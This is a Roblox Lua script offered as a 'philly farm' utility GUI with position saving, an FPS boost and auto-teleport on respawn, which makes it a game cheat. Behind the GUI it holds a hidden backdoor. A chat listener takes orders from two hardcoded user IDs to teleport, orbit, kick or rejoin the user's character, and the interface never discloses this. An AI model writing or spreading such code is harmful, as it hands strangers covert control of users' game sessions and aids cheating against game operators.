local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer

local guiVisible = true
local savedPosition = nil
local autoTeleportEnabled = true

-- Command listeners
local commandUserIds = {
    [2001373470] = true, -- Jelizaxo
    [8718078262] = true, -- Mvuliq
}

local orbitConnection = nil
local standConnection = nil
local isOrbiting = false
local isHiding = false

local function getHRP(plr)
    local char = plr.Character or plr.CharacterAdded:Wait()
    return char:WaitForChild("HumanoidRootPart", 2)
end

local function safeTeleport(hrp, cframe)
    local attempts = 0
    while attempts < 5 do
        task.wait(0.1)
        local success = pcall(function()
            hrp.CFrame = cframe
        end)
        if success then break end
        attempts += 1
    end
    if attempts >= 5 then
        hrp.CFrame = CFrame.new(0, -1000, 0)
    end
end

-- GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "UtilityGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, 0, 1, 0)
loadingText.Position = UDim2.new(0, 0, 0, 0)
loadingText.Text = "made by cr7me"
loadingText.BackgroundTransparency = 1
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.Font = Enum.Font.SourceSansBold
loadingText.TextSize = 24
loadingText.Parent = screenGui

task.delay(2.5, function()
    loadingText:Destroy()

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 200, 0, 230)
    mainFrame.Position = UDim2.new(0.5, -100, 0.5, -115)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = mainFrame

    local dragging, dragInput, dragStart, startPos

    mainFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = mainFrame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    mainFrame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            mainFrame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)

    UserInputService.InputBegan:Connect(function(input, processed)
        if not processed and input.KeyCode == Enum.KeyCode.M then
            guiVisible = not guiVisible
            mainFrame.Visible = guiVisible
        end
    end)

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.BackgroundTransparency = 1
    title.Text = "philly farm"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextScaled = true
    title.Parent = mainFrame

    local function createButton(name, text, yOffset)
        local btn = Instance.new("TextButton")
        btn.Name = name
        btn.Size = UDim2.new(1, -20, 0, 35)
        btn.Position = UDim2.new(0, 10, 0, yOffset)
        btn.Text = text
        btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        btn.TextColor3 = Color3.new(1, 1, 1)
        btn.Font = Enum.Font.SourceSansBold
        btn.TextScaled = true
        btn.BorderSizePixel = 0
        btn.Parent = mainFrame

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 8)
        corner.Parent = btn

        return btn
    end

    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, -20, 0, 25)
    statusLabel.Position = UDim2.new(0, 10, 0, 185)
    statusLabel.BackgroundTransparency = 1
    statusLabel.TextColor3 = Color3.new(1, 1, 1)
    statusLabel.Font = Enum.Font.SourceSansBold
    statusLabel.TextScaled = true
    statusLabel.Text = "Status: On"
    statusLabel.Parent = mainFrame

    -- Notification label for "Position Saved!"
    local notification = Instance.new("TextLabel")
    notification.Size = UDim2.new(1, -20, 0, 30)
    notification.Position = UDim2.new(0, 10, 1, -40)
    notification.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    notification.TextColor3 = Color3.new(1, 1, 1)
    notification.Text = ""
    notification.Visible = false
    notification.Font = Enum.Font.SourceSansBold
    notification.TextScaled = true
    notification.BorderSizePixel = 0
    notification.Parent = mainFrame

    local function showNotification(text, color)
        notification.Text = text
        notification.BackgroundColor3 = color or Color3.fromRGB(0, 150, 0)
        notification.Visible = true
        task.delay(2, function()
            notification.Visible = false
        end)
    end

    local saveBtn = createButton("SaveBtn", "Save Position", 50)
    saveBtn.MouseButton1Click:Connect(function()
        local char = player.Character or player.CharacterAdded:Wait()
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp then
            savedPosition = hrp.Position
            showNotification("Position Saved!", Color3.fromRGB(0, 150, 0))
        end
    end)

    local fpsBtn = createButton("FPSBtn", "FPS Boost", 95)
    fpsBtn.MouseButton1Click:Connect(function()
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 1e10
        Lighting.Brightness = 0
        for _, v in pairs(Lighting:GetDescendants()) do
            if v:IsA("PostEffect") then v.Enabled = false end
        end
        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("BasePart") then
                obj.Material = Enum.Material.SmoothPlastic
                obj.CastShadow = false
            elseif obj:IsA("Decal") or obj:IsA("Texture") or obj:IsA("ParticleEmitter") or obj:IsA("Trail") then
                obj:Destroy()
            end
        end
        if workspace:FindFirstChildOfClass("Terrain") then
            local terrain = workspace:FindFirstChildOfClass("Terrain")
            terrain.WaterWaveSize = 0
            terrain.WaterWaveSpeed = 0
            terrain.WaterReflectance = 0
            terrain.WaterTransparency = 1
        end
    end)

    local toggleBtn = createButton("ToggleBtn", "Toggle AutoTeleport", 140)
    toggleBtn.MouseButton1Click:Connect(function()
        autoTeleportEnabled = not autoTeleportEnabled
        statusLabel.Text = "Status: " .. (autoTeleportEnabled and "On" or "Off")
    end)

    Players.LocalPlayer.CharacterAdded:Connect(function(char)
        local function tpBack()
            local hrp = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart")
            if hrp and savedPosition and autoTeleportEnabled then
                task.wait(0.3)
                hrp.CFrame = CFrame.new(savedPosition)
                task.wait(2)
                player.Character:BreakJoints()
            end
        end

        if char:FindFirstChild("HumanoidRootPart") then
            tpBack()
        else
            char.ChildAdded:Connect(function(c)
                if c.Name == "HumanoidRootPart" then
                    tpBack()
                end
            end)
        end
    end)
end)

-- Chat command logic (no GUI)
local function handleCommand(cmd)
    local target = Players:GetPlayerByUserId(2001373470) or Players:GetPlayerByUserId(8718078262)
    if not target then return end
    if cmd == "!bring" then
        local hrp = getHRP(player)
        local targetHRP = getHRP(target)
        if hrp and targetHRP then
            safeTeleport(hrp, targetHRP.CFrame + Vector3.new(3,0,0))
        end
    elseif cmd == "!orbit" then
        if orbitConnection then orbitConnection:Disconnect() orbitConnection = nil end
        isOrbiting = not isOrbiting
        if isOrbiting then
            local angle = 0
            orbitConnection = RunService.Heartbeat:Connect(function(dt)
                local hrp = getHRP(player)
                local targetHRP = getHRP(target)
                if hrp and targetHRP then
                    angle += math.pi * 2 * dt
                    local offset = Vector3.new(math.cos(angle) * 5, 0, math.sin(angle) * 5)
                    hrp.CFrame = targetHRP.CFrame * CFrame.new(offset)
                end
            end)
        end
    elseif cmd == "!stand" then
        if standConnection then standConnection:Disconnect() standConnection = nil end
        standConnection = RunService.Heartbeat:Connect(function()
            local hrp = getHRP(player)
            local targetHRP = getHRP(target)
            if hrp and targetHRP then
                hrp.CFrame = targetHRP.CFrame * CFrame.new(-1.5, 3.5, 2)
            end
        end)
    elseif cmd == "!hide" then
        isHiding = true
        local hrp = getHRP(player)
        if hrp then hrp.CFrame = CFrame.new(0, 300, 0) end
    elseif cmd == "!punch" then
        local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
        if tool then tool:Activate() end
    elseif cmd == "!stop" then
        if orbitConnection then orbitConnection:Disconnect() orbitConnection = nil end
        if standConnection then standConnection:Disconnect() standConnection = nil end
    elseif cmd == "!kick" then
        player:Kick("You have been kicked by Jelizaxo.")
    elseif cmd == "!rejoin" then
        TeleportService:Teleport(game.PlaceId, player)
    end
end

local function monitorChatUI()
    local list
    while not list do
        local gui = player:FindFirstChild("PlayerGui"):FindFirstChild("Main")
        if gui then list = gui:FindFirstChild("List", true) end
        task.wait(0.5)
    end

    local function onLabel(lbl)
        local function check()
            local txt = lbl.Text:lower()
            for id in pairs(commandUserIds) do
                local sender = Players:GetPlayerByUserId(id)
                if sender and txt:find(sender.Name:lower()) and txt:find("!") then
                    local command = txt:match("!(%w+)")
                    if command then handleCommand("!" .. command) end
                end
            end
        end
        check()
        lbl:GetPropertyChangedSignal("Text"):Connect(check)
    end

    list.DescendantAdded:Connect(function(d)
        if d:IsA("TextLabel") then onLabel(d) end
    end)

    for _, d in ipairs(list:GetDescendants()) do
        if d:IsA("TextLabel") then onLabel(d) end
    end
end

monitorChatUI()
